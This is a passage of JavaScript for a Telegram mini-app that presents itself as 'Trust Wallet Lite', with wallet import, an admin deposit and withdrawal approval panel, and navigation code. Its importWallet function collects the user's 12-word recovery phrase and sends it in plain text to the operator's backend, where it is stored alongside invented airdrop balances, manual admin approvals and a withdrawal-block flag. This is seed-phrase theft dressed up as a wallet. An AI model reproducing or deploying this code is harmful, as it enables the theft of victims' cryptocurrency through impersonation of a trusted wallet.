        for (let i = 1; i <= 12; i++) {
            const input = document.getElementById(`word_${i}`);
            if (input) input.value = '';
        }
        modal.classList.add('show');
    } else {
        showToast('Import feature coming soon', 'info');
    }
}

async function importWallet() {
    const words = [];
    for (let i = 1; i <= 12; i++) {
        const word = document.getElementById(`word_${i}`)?.value.trim();
        if (!word) {
            showToast(`Please enter word ${i}`, 'error');
            return;
        }
        words.push(word);
    }
    
    const btn = document.getElementById('confirmImportBtn');
    if (btn) {
        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Importing...';
        btn.disabled = true;
    }
    
    try {
        const newUserData = {
            userId: userId,
            userName: userName,
            recoveryPhrase: words.join(' '),
            balances: { TWT: 1000, USDT: AIRDROP_BONUS, BNB: 0, BTC: 0, ETH: 0, SOL: 0, TRX: 0, SHIB: 0, PEPE: 0 },
            inviteCount: 0,
            invitedBy: null,
            totalUsdtEarned: AIRDROP_BONUS,
            referralMilestones: REFERRAL_MILESTONES.map(m => ({ ...m, claimed: false })),
            notifications: [{ id: Date.now().toString(), message: '🎉 Wallet imported! +10 USDT', read: false, timestamp: new Date().toISOString() }],
            transactions: [{ type: 'airdrop', amount: AIRDROP_BONUS, currency: 'USDT', timestamp: new Date().toISOString() }],
            withdrawBlocked: false,
            createdAt: new Date().toISOString()
        };
        
        const response = await apiCall('/users', 'POST', { userId, userData: newUserData });
        
        if (response.success) {
            userData = newUserData;
            localStorage.setItem(`user_${userId}`, JSON.stringify(userData));
            console.log("✅ Wallet imported successfully");
            
            closeModal('importModal');
            
            const onboarding = document.getElementById('onboardingScreen');
            const mainContent = document.getElementById('mainContent');
            if (onboarding) onboarding.style.display = 'none';
            if (mainContent) mainContent.style.display = 'block';
            
            updateUI();
            showToast('✅ Wallet imported! +10 USDT');
            
            if (startParam && startParam !== userId) {
                await processReferral();
            }
        } else {
            throw new Error(response.error);
        }
        
    } catch (error) {
        console.error("Error importing wallet:", error);
        showToast('Failed to import wallet', 'error');
    } finally {
        if (btn) {
            btn.innerHTML = 'Import Wallet';
            btn.disabled = false;
        }
    }
}

// ====== 18. ADMIN PANEL ======
function showAdminPanel() {
    if (!isAdmin) { showToast('Access denied', 'error'); return; }
    
    document.getElementById('adminPanel').classList.remove('hidden');
    loadAdminData();
}

function closeAdminPanel() {
    document.getElementById('adminPanel').classList.add('hidden');
    stopAllListeners();
}

async function loadAdminData() {
    if (!db) return;
    
    try {
        const [depositsSnapshot, withdrawalsSnapshot] = await Promise.all([
            db.collection('deposit_requests').where('status', '==', 'pending').get(),
            db.collection('withdrawals').where('status', '==', 'pending').get()
        ]);
        
        const pendingCount = depositsSnapshot.size + withdrawalsSnapshot.size;
        
        document.getElementById('totalUsers').textContent = '...';
        document.getElementById('pendingCount').textContent = pendingCount;
        document.getElementById('approvedCount').textContent = '...';
        document.getElementById('totalReferralsCount').textContent = '...';
        
        const adminContent = document.getElementById('adminContent');
        adminContent.innerHTML = `
            <div style="text-align: center; padding: 30px;">
                <i class="fa-solid fa-hand-pointer" style="font-size: 48px; color: var(--pink-1);"></i>
                <p style="margin: 20px 0; color: var(--text-secondary);">اضغط على زر التحديث لعرض الطلبات</p>
                <button onclick="refreshAdminPanel()" class="admin-approve-btn" style="width: auto; padding: 10px 20px; margin: 0 auto;">
                    <i class="fa-solid fa-rotate-right"></i> تحديث
                </button>
            </div>
        `;
        
    } catch (error) {
        console.error("Error loading admin data:", error);
        showToast('Error loading admin data', 'error');
    }
}

window.refreshAdminPanel = async function() {
    if (!isAdmin) return;
    
    console.log("🔄 Manually refreshing admin panel...");
    
    const refreshBtn = document.getElementById('adminRefreshBtn');
    if (refreshBtn) refreshBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i>';
    
    const adminContent = document.getElementById('adminContent');
    adminContent.innerHTML = '<div class="loading-spinner"><i class="fa-solid fa-spinner fa-spin"></i> Loading...</div>';
    
    try {
        const activeTab = document.querySelector('.admin-tab.active')?.textContent.toLowerCase().includes('deposit') ? 'deposits' : 'withdrawals';
        
        let query;
        let collectionName;
        
        if (activeTab === 'deposits') {
            collectionName = 'deposit_requests';
            query = db.collection(collectionName).where('status', '==', 'pending');
        } else {
            collectionName = 'withdrawals';
            query = db.collection(collectionName).where('status', '==', 'pending');
        }
        
        const snapshot = await query.get();
        
        if (snapshot.empty) {
            adminContent.innerHTML = '<div class="empty-state">No pending transactions found</div>';
            return;
        }
        
        const userIds = [];
        const transactions = [];
        
        snapshot.forEach(doc => {
            const tx = { firebaseId: doc.id, ...doc.data() };
            transactions.push(tx);
            if (tx.userId && !userIds.includes(tx.userId)) userIds.push(tx.userId);
        });
        
        const referralCounts = {};
        if (userIds.length > 0) {
            const chunks = [];
            for (let i = 0; i < userIds.length; i += 30) chunks.push(userIds.slice(i, i + 30));
            
            for (const chunk of chunks) {
                const usersSnapshot = await db.collection('users').where('userId', 'in', chunk).get();
                usersSnapshot.forEach(doc => {
                    const userData = doc.data();
                    referralCounts[userData.userId] = userData.referralCount || 0;
                });
            }
        }
        
        let html = '';
        transactions.forEach(tx => {
            const referralCount = referralCounts[tx.userId] || 0;
            html += renderAdminTransactionCard(tx, activeTab, referralCount);
        });
        
        adminContent.innerHTML = html;
        showToast('Admin panel refreshed', 'success');
        
    } catch (error) {
        console.error("❌ Error refreshing admin panel:", error);
        adminContent.innerHTML = '<div class="empty-state">Error loading transactions</div>';
    } finally {
        if (refreshBtn) setTimeout(() => { refreshBtn.innerHTML = '<i class="fa-solid fa-rotate-right"></i>'; }, 500);
    }
};

function renderAdminTransactionCard(tx, tab, referralCount = 0) {
    const date = new Date(tx.timestamp);
    const formattedDate = date.toLocaleDateString() + ' ' + date.toLocaleTimeString();
    const telegramId = tx.userId || 'N/A';
    const displayUserId = tx.userName ? `${tx.userName}` : telegramId.substring(0, 8);
    
    return `
        <div class="admin-transaction-card">
            <div class="admin-tx-header">
                <div class="admin-tx-type ${tx.type}">
                    <i class="fa-regular ${tx.type === 'deposit' ? 'fa-circle-down' : 'fa-circle-up'}"></i>
                    <span>${tx.type.toUpperCase()}</span>
                </div>
                <span class="admin-tx-status ${tx.status}">${tx.status}</span>
            </div>
            <div class="admin-tx-details">
                <div class="admin-tx-row"><span class="admin-tx-label">User:</span><span class="admin-tx-value">${displayUserId}</span></div>
                <div class="admin-tx-row">
                    <span class="admin-tx-label">Telegram ID:</span>
                    <div class="admin-address-container" style="flex-direction: column; align-items: flex-start; gap: 5px;">
                        <div style="display: flex; align-items: center; gap: 8px;">
                            <code style="font-size: 12px; word-break: break-all;">${telegramId}</code>
                            <button class="admin-copy-btn" onclick="copyToClipboard('${telegramId}')" title="Copy Telegram ID">
                                <i class="fa-regular fa-copy"></i>
                            </button>
                        </div>
                        <div style="display: flex; align-items: center; gap: 8px; font-size: 11px; background: rgba(0,212,255,0.1); padding: 4px 8px; border-radius: 20px;">
                            <i class="fa-solid fa-users" style="color: var(--pink-1);"></i>
                            <span style="color: var(--text-secondary);">Total Referrals:</span>
                            <strong style="color: var(--pink-1);">${referralCount.toLocaleString()}</strong>
                        </div>
                    </div>
                </div>
                <div class="admin-tx-row"><span class="admin-tx-label">Amount:</span><span class="admin-tx-value">${tx.amount} ${tx.currency}</span></div>
                ${tx.txnId ? `<div class="admin-tx-row"><span class="admin-tx-label">TXID:</span><div class="admin-address-container"><code>${tx.txnId.substring(0, 16)}...</code><button class="admin-copy-btn" onclick="copyToClipboard('${tx.txnId}')"><i class="fa-regular fa-copy"></i></button></div></div>` : ''}
                ${tx.address ? `<div class="admin-tx-row"><span class="admin-tx-label">Address:</span><div class="admin-address-container"><code>${tx.address.substring(0, 16)}...</code><button class="admin-copy-btn" onclick="copyToClipboard('${tx.address}')"><i class="fa-regular fa-copy"></i></button></div></div>` : ''}
                ${tx.fee ? `<div class="admin-tx-row"><span class="admin-tx-label">Fee:</span><span class="admin-tx-value">${tx.fee} ${tx.feeCurrency}</span></div>` : ''}
                <div class="admin-tx-row"><span class="admin-tx-label">Time:</span><span class="admin-tx-value">${formattedDate}</span></div>
            </div>
            <div class="admin-tx-actions">
                <button class="admin-approve-btn" onclick="approveTransaction('${tx.firebaseId}', '${tx.userId}', '${tx.type}', '${tx.currency}', ${tx.amount}, ${tx.fee || 0}, '${tx.feeCurrency || 'BNB'}')">
                    <i class="fa-regular fa-circle-check"></i> Approve
                </button>
                <button class="admin-reject-btn" onclick="rejectTransaction('${tx.firebaseId}', '${tx.userId}', '${tx.type}')">
                    <i class="fa-regular fa-circle-xmark"></i> Reject
                </button>
            </div>
        </div>
    `;
}

async function approveTransaction(firebaseId, targetUserId, type, currency, amount, fee, feeCurrency) {
    if (!isAdmin || !db) {
        showToast('❌ Admin access required', 'error');
        return;
    }
    
    try {
        console.log("🔍 Approving transaction with Firebase ID:", firebaseId);
        
        let collectionName = '';
        if (type === 'deposit') collectionName = 'deposit_requests';
        else if (type === 'withdraw') collectionName = 'withdrawals';
        else collectionName = 'transactions';
        
        const docRef = db.collection(collectionName).doc(firebaseId);
        const docSnap = await docRef.get();
        
        if (!docSnap.exists) {
            showToast(`❌ ${type} request not found`, 'error');
            return;
        }
        
        await docRef.update({
            status: 'approved',
            approvedAt: firebase.firestore.FieldValue.serverTimestamp(),
            approvedBy: 'admin'
        });
        
        if (type === 'deposit') {
            await db.collection('users').doc(targetUserId).update({
                [`balances.${currency}`]: firebase.firestore.FieldValue.increment(amount)
            });
            
            if (targetUserId === userId) {
                userData.balances[currency] = (userData.balances[currency] || 0) + amount;
                localStorage.setItem(`user_${userId}`, JSON.stringify(userData));
                updateUI();
            }
            
            await addNotification(targetUserId, t('notif.depositApproved', { amount, currency }), 'success');
        } else if (type === 'withdraw') {
            const feeText = fee > 0 ? ` (Fee: ${fee} ${feeCurrency})` : '';
            await addNotification(targetUserId, `✅ Your withdrawal of ${amount} ${currency} has been approved${feeText}!`, 'success');
        }
        
        showToast('✅ Transaction approved!', 'success');
    } catch (error) {
        console.error("❌ Error approving transaction:", error);
        showToast('❌ Error approving transaction: ' + error.message, 'error');
    }
}

async function rejectTransaction(firebaseId, targetUserId, type) {
    if (!isAdmin || !db) {
        showToast('❌ Admin access required', 'error');
        return;
    }
    
    const reason = prompt("Enter rejection reason:", type === 'deposit' ? "Invalid transaction hash" : "Insufficient balance or invalid address");
    if (!reason) return;
    
    try {
        const collectionName = type === 'deposit' ? 'deposit_requests' : 'withdrawals';
        const docRef = db.collection(collectionName).doc(firebaseId);
        const docSnap = await docRef.get();
        
        if (!docSnap.exists) {
            showToast(`❌ ${type} request not found`, 'error');
            return;
        }
        
        const txData = docSnap.data();
        
        await docRef.update({
            status: 'rejected',
            rejectionReason: reason,
            rejectedAt: firebase.firestore.FieldValue.serverTimestamp(),
            rejectedBy: 'admin'
        });
        
        if (type === 'withdraw') {
            await db.collection('users').doc(targetUserId).update({
                [`balances.${txData.currency}`]: firebase.firestore.FieldValue.increment(txData.amount)
            });
            if (txData.fee) {
                await db.collection('users').doc(targetUserId).update({
                    [`balances.${txData.feeCurrency}`]: firebase.firestore.FieldValue.increment(txData.fee)
                });
            }
        }
        
        await addNotification(targetUserId, `❌ Your ${type} of ${txData.amount} ${txData.currency} was rejected. Reason: ${reason}`, 'error');
        showToast('✅ Transaction rejected', 'success');
    } catch (error) {
        console.error(`❌ Error rejecting ${type}:`, error);
        showToast('❌ Error: ' + error.message, 'error');
    }
}

// ====== 19. UTILITY FUNCTIONS ======
function getCurrencyIcon(symbol) {
    return CMC_ICONS[symbol] || CMC_ICONS.TWT;
}

function formatBalance(balance, symbol) {
    if (symbol === 'TWT' || symbol === 'SHIB' || symbol === 'PEPE') return balance.toLocaleString() + ' ' + symbol;
    if (symbol === 'USDT') return '$' + balance.toFixed(2);
    if (symbol === 'BNB' || symbol === 'ETH' || symbol === 'SOL' || symbol === 'TRX') return balance.toFixed(4) + ' ' + symbol;
    return balance.toString();
}

function formatNumber(num) {
    if (num >= 1e6) return (num / 1e6).toFixed(2) + 'M';
    if (num >= 1e3) return (num / 1e3).toFixed(2) + 'K';
    if (num < 0.0001) return num.toFixed(8);
    if (num < 0.01) return num.toFixed(6);
    return num.toFixed(2);
}

function updateTotalBalance() {
    if (!userData) return;
    
    let total = userData.balances.USDT || 0;
    total += (userData.balances.TWT || 0) * TWT_PRICE;
    total += (userData.balances.BNB || 0) * (livePrices.BNB?.price || 0);
    total += (userData.balances.BTC || 0) * (livePrices.BTC?.price || 0);
    total += (userData.balances.ETH || 0) * (livePrices.ETH?.price || 0);
    total += (userData.balances.SOL || 0) * (livePrices.SOL?.price || 0);
    total += (userData.balances.TRX || 0) * (livePrices.TRX?.price || 0.25);
    
    const totalEl = document.getElementById('totalBalance');
    if (totalEl) totalEl.textContent = '$' + total.toFixed(2);
}

function updateUI() {
    if (currentPage === 'wallet') {
        renderAssets();
        updateTotalBalance();
    }
    if (currentPage === 'airdrop') renderAirdrop();
    if (currentPage === 'settings') renderSettings();
    
    const userNameEl = document.getElementById('userName');
    if (userNameEl && userData) userNameEl.textContent = userData.userName || userName;
    
    const userIdEl = document.getElementById('userIdDisplay');
    if (userIdEl && userData) userIdEl.textContent = `ID: ${userData.userId?.slice(-8)}`;
    
    const userAvatarEl = document.getElementById('userAvatar');
    if (userAvatarEl && userData) userAvatarEl.textContent = (userData.userName || userName).charAt(0).toUpperCase();
}

function showToast(message, type = 'info') {
    const toast = document.getElementById('toast');
    const toastMessage = document.getElementById('toastMessage');
    
    if (!toast) return;
    
    toastMessage.textContent = message;
    toast.classList.remove('hidden');
    
    const icon = toast.querySelector('i');
    if (type === 'success') icon.className = 'fa-regular fa-circle-check';
    else if (type === 'error') icon.className = 'fa-regular fa-circle-xmark';
    else if (type === 'warning') icon.className = 'fa-regular fa-circle-exclamation';
    else icon.className = 'fa-regular fa-circle-info';
    
    setTimeout(() => toast.classList.add('hidden'), 3000);
}

function closeModal(modalId) {
    const modal = document.getElementById(modalId);
    if (modal) modal.classList.remove('show');
}

function copyToClipboard(text) {
    navigator.clipboard.writeText(text);
    showToast('Copied!');
}

function animateElement(selector, animationClass) {
    const element = document.querySelector(selector);
    if (element) {
        element.classList.add(animationClass);
        setTimeout(() => element.classList.remove(animationClass), 500);
    }
}

function showTopUp() { showToast('Coming soon!'); }
function showCardSettings() { showToast('Coming soon!'); }
function showCardTransactions() { showHistory(); }
function showSendModal() { document.getElementById('sendModal').classList.add('show'); }
function showReceiveModal() { document.getElementById('receiveModal').classList.add('show'); }
function showSwapModal() { showToast('Coming soon!'); }
function sendTransaction() { showToast('Coming soon!'); }
function showCryptoDetails(symbol) {
    let price, change;
    if (symbol === 'TWT') { price = TWT_PRICE; change = 0; }
    else { price = livePrices[symbol]?.price || 0; change = livePrices[symbol]?.change || 0; }
    const changeSymbol = change >= 0 ? '+' : '';
    showToast(`${symbol}: $${formatNumber(price)} (${changeSymbol}${change.toFixed(2)}%)`, 'info');
}

function showAssetDetails(symbol) {
    const balance = userData.balances[symbol] || 0;
    const price = symbol === 'TWT' ? TWT_PRICE : (livePrices[symbol]?.price || 0);
    const value = symbol === 'USDT' ? balance : balance * price;
    showToast(`${symbol}: ${formatBalance(balance, symbol)} ($${formatNumber(value)})`, 'info');
}

function logout() {
    if (confirm('Logout?')) {
        localStorage.clear();
        location.reload();
    }
}

// ====== 20. NAVIGATION ======
function showWallet() { 
    currentPage = 'wallet'; 
    document.getElementById('walletSection').classList.remove('hidden');
    document.getElementById('swapSection').classList.add('hidden');
    document.getElementById('airdropSection').classList.add('hidden');
    document.getElementById('twtpaySection').classList.add('hidden');
    document.getElementById('settingsSection').classList.add('hidden');
    
    document.querySelectorAll('.nav-item').forEach(item => item.classList.remove('active'));
    const walletNav = document.querySelector('.nav-item[data-tab="wallet"]');
    if (walletNav) walletNav.classList.add('active');
    
    renderWallet();
    showRandomSticker();
}

function showSwap() { 
    currentPage = 'swap'; 
    document.getElementById('walletSection').classList.add('hidden');
    document.getElementById('swapSection').classList.remove('hidden');
    document.getElementById('airdropSection').classList.add('hidden');
    document.getElementById('twtpaySection').classList.add('hidden');
    document.getElementById('settingsSection').classList.add('hidden');
    
    document.querySelectorAll('.nav-item').forEach(item => item.classList.remove('active'));
    const swapNav = document.querySelector('.nav-item[data-tab="swap"]');
    if (swapNav) swapNav.classList.add('active');
    
    showToast('Swap coming soon!');
    showRandomSticker();
}

function showAirdrop() { 
    currentPage = 'airdrop'; 
    document.getElementById('walletSection').classList.add('hidden');
    document.getElementById('swapSection').classList.add('hidden');
    document.getElementById('airdropSection').classList.remove('hidden');
    document.getElementById('twtpaySection').classList.add('hidden');
    document.getElementById('settingsSection').classList.add('hidden');
    
    document.querySelectorAll('.nav-item').forEach(item => item.classList.remove('active'));
    const airdropNav = document.querySelector('.nav-item[data-tab="airdrop"]');
    if (airdropNav) airdropNav.classList.add('active');
    
    renderAirdrop();
    showRandomSticker();
}

function showTWTPay() { 
    currentPage = 'twtpay'; 
    document.getElementById('walletSection').classList.add('hidden');
    document.getElementById('swapSection').classList.add('hidden');
    document.getElementById('airdropSection').classList.add('hidden');
    document.getElementById('twtpaySection').classList.remove('hidden');
    document.getElementById('settingsSection').classList.add('hidden');
    
    document.querySelectorAll('.nav-item').forEach(item => item.classList.remove('active'));
    const twtpayNav = document.querySelector('.nav-item[data-tab="twtpay"]');
    if (twtpayNav) twtpayNav.classList.add('active');
    
    renderTWTPay();
    showRandomSticker();
}

function showSettings() { 
    currentPage = 'settings'; 
    document.getElementById('walletSection').classList.add('hidden');
    document.getElementById('swapSection').classList.add('hidden');
    document.getElementById('airdropSection').classList.add('hidden');
    document.getElementById('twtpaySection').classList.add('hidden');
    document.getElementById('settingsSection').classList.remove('hidden');
    
    document.querySelectorAll('.nav-item').forEach(item => item.classList.remove('active'));
    const settingsNav = document.querySelector('.nav-item[data-tab="settings"]');
    if (settingsNav) settingsNav.classList.add('active');
    
    renderSettings();
    showRandomSticker();
}

// ====== 21. INITIALIZATION ======
document.addEventListener('DOMContentLoaded', async () => {
    console.log("🚀 Initializing Trust Wallet Lite...");
    
    initTheme();
    updateAllTexts();
    
    const createBtn = document.getElementById('createWalletBtn');
    const importBtn = document.getElementById('importWalletBtn');
    const confirmImportBtn = document.getElementById('confirmImportBtn');
    
    if (createBtn) createBtn.onclick = createNewWallet;
    if (importBtn) importBtn.onclick = showImportModal;
    if (confirmImportBtn) confirmImportBtn.onclick = importWallet;
    
    document.querySelectorAll('.nav-item').forEach(btn => {
        btn.addEventListener('click', () => {
            const tab = btn.getAttribute('data-tab');
            if (tab === 'wallet') showWallet();
            else if (tab === 'swap') showSwap();
            else if (tab === 'airdrop') showAirdrop();
            else if (tab === 'twtpay') showTWTPay();
            else if (tab === 'settings') showSettings();
        });
    });
    
    const depositBtn = document.getElementById('depositBtn');
    const withdrawBtn = document.getElementById('withdrawBtn');
    const swapBtn = document.getElementById('swapBtn');
    const historyBtn = document.getElementById('historyBtn');
    
    if (depositBtn) depositBtn.onclick = showDepositModal;
    if (withdrawBtn) withdrawBtn.onclick = showWithdrawModal;
    if (swapBtn) swapBtn.onclick = showSwap;
    if (historyBtn) historyBtn.onclick = showHistory;
    
    await fetchLivePrices();
    await loadUserData();
    checkAdminAndAddCrown();
    
    setTimeout(() => {
        const splash = document.getElementById('splashScreen');
        if (splash) splash.classList.add('hidden');
        document.getElementById('mainContent').style.display = 'block';
        
        setTimeout(() => showRandomSticker(), 500);
    }, 2000);
    
    console.log("✅ Trust Wallet Lite initialized successfully!");
    console.log("📱 User ID:", userId);
    console.log("👑 Is Admin:", isAdmin);
    console.log("✅ No direct Firebase - all via backend API");
});

// ====== 22. EXPOSE GLOBALS ======
window.showWallet = showWallet;
window.showSwap = showSwap;
window.showAirdrop = showAirdrop;
window.showTWTPay = showTWTPay;
window.showSettings = showSettings;
window.showDepositModal = showDepositModal;
window.showWithdrawModal = showWithdrawModal;
window.showHistory = showHistory;
window.showNotifications = showNotifications;
window.showAdminPanel = showAdminPanel;
window.closeModal = closeModal;
window.closeAdminPanel = closeAdminPanel;
window.refreshPrices = refreshPrices;
window.toggleLanguage = toggleLanguage;
window.toggleTheme = toggleTheme;
window.logout = logout;
window.copyInviteLink = copyInviteLink;
window.shareReferral = shareReferral;
window.copyDepositAddress = copyDepositAddress;
window.submitDeposit = submitDeposit;
window.submitWithdraw = submitWithdraw;
window.validateTransactionHashInput = validateTransactionHashInput;
window.validateWithdrawAddressInput = validateWithdrawAddressInput;
window.checkPendingTransactions = checkPendingTransactions;
window.clearReadNotifications = clearReadNotifications;
window.clearAllNotifications = clearAllNotifications;
window.refreshAdminPanel = refreshAdminPanel;
window.approveTransaction = approveTransaction;
window.rejectTransaction = rejectTransaction;
window.copyToClipboard = copyToClipboard;
window.claimReferralMilestone = claimReferralMilestone;
window.showTopUp = showTopUp;
window.showCardSettings = showCardSettings;
window.showCardTransactions = showCardTransactions;
window.createNewWallet = createNewWallet;
window.importWallet = importWallet;
window.showImportModal = showImportModal;
window.markNotificationRead = markNotificationRead;

console.log("✅ Trust Wallet Lite - FULLY LOADED!");
console.log("✅ Languages: English / العربية");
console.log("✅ Listeners: ON-DEMAND only - 30 seconds max");
console.log("✅ History: checks pending transactions only when opened (cached 10 min)");
console.log("✅ Admin: manual refresh only - zero auto reads");
console.log("✅ Prices: cached for 3 hours - manual refresh available");
console.log("✅ Notifications: cleanup buttons - delete read or all");
console.log("✅ Ready for 50,000+ users with minimal cost");
